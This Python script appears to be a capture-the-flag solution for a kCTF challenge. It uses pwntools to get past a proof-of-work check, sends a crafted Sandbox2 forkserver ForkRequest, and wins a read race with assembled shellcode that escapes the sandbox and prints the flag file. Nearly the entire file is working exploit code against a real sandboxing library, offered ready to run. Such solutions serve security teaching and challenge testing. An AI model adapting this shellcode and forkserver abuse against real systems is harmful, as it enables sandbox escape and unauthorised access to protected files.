#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.context
import pwnlib.tubes
import pwnlib.util
import pwnlib.util.misc
import pwnlib.shellcraft as sc
from pwnlib.util.packing import *
from pwnlib.asm import asm
from pwnlib.util.fiddling import hexdump

import sandboxed_api.sandbox2.forkserver_pb2 as forkserver_pb2

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

def send_payload(r, payload):
    r.sendline(str(len(payload)).encode('ascii'))
    r.send(payload)

pwnlib.context.context.arch = 'amd64'
pwnlib.context.context.bits = 64

def setup_connection(host, port):
    r = pwnlib.tubes.remote.remote(host, port)
    r.recvuntil(b'== proof-of-work: ')
    if r.recvline().startswith(b'enabled'):
        handle_pow(r)
    return r

debug = False

def DLOG(msg):
    if debug:
        print(msg)

def LOG(msg):
    print(msg)

def try_to_pwn(r):
    r.sendline(b'2')
    r.sendline(b'cool')
    fork_request = forkserver_pb2.ForkRequest()
    fork_request.mount_tree.node.root_node.writable = False
    fork_request.hostname = b'EGG' + b'A' * 20
    # for debugging
    add_info = 0
    prefix_len = 12 + fork_request.SerializeToString().index(b'EGG') + 11
    send_payload(r, asm(sc.linux.read(4, 'rsp', prefix_len + add_info) + 'push 0\nadd rax, 8\n' + sc.linux.write(1, 'rsp', 'rax') + sc.linux.echo(b'}}}}') + sc.linux.exit(0)))
    fork_request.hostname = b'a'
    fork_request.clone_flags = 0x20000000 | 0x10000000 | 0x20000
    fork_request.mode = forkserver_pb2.Mode.FORKSERVER_FORK
    fork_request.mount_tree.node.dir_node.outside = "/"
    fork_request_str = fork_request.SerializeToString()
    DLOG('[*] Fork request\n{}'.format(hexdump(fork_request_str)))
    sent_len = len(fork_request_str) + 4
    r.sendline(b'EGG' + p32(0x80000102) + p64(sent_len) + fork_request_str)
    read_flag = sc.open('flag', 0) + 'sub rsp, 100\n' + sc.read('rax', 'rsp', 100) + sc.write(1, 'rsp', 'rax')
    send_payload(r, asm(sc.linux.echo(b'Flag [[[[') + read_flag + sc.linux.echo(b']]]]') + sc.exit(0)))
    content = r.recvuntil([b'\0'*8, b'Flag [[[['])
    if not content.endswith(b'\0'*8):
        print('[-] lost prefix read race (reader stuck)')
        return None
    prefix_read = r.recvuntil(b'}}}}', drop=True)
    DLOG('[*] prefix read\n{}'.format(hexdump(prefix_read)))
    prefix_read = prefix_read[:prefix_len]
    valid = False
    if prefix_read.startswith(p32(0x80000102)) and prefix_read.endswith(b'EGG'):
        LOG('[+] read valid prefix (before to any forkserver read)')
        valid = True
    if prefix_read.endswith(b'EGG' + p32(0x80000102)):
        LOG('[+] read valid prefix (after forkserver "tag" read)')
        valid = True
    if not valid:
        LOG('[-] lost prefix read race (invalid read)')
        return None
    r.recvuntil(b'Flag [[[[')
    flag = r.recvuntil(b']]]]', drop=True, timeout=1)
    LOG('[*] Got flag: {}'.format(flag))
    return flag

def pwn(host, port, retries=10):
    for i in range(1, retries):
        print('>>> Attempt {}'.format(i))
        flag = try_to_pwn(setup_connection(host, port))
        if flag is not None:
            return flag
    return None

if __name__ == '__main__':
    import sys
    pwn(sys.argv[1], sys.argv[2])
    exit(0)
